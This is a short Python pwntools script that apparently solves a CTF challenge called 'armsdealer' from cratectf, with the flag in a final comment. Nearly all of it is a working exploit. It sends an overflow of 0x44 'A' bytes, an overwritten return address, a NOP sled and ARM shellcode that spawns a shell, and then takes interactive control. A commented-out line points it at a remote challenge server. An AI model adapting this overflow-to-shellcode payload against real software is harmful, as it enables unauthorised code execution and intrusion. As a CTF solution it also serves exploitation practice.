from pwn import *

context.arch = 'arm'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./armsdealer', '''
    b *0x100d0
    continue
''')

# p = remote('challs.crate.nu', 47202)

# apt install binutils-arm-linux-gnueabihf

p.send(b'A'*0x44+p32(0x40800600)+asm('nop')*0x60+asm(shellcraft.sh()))

p.interactive()

# cratectf{shellkod_i_mitt_program!?_skulle_aldrig_tillåtas}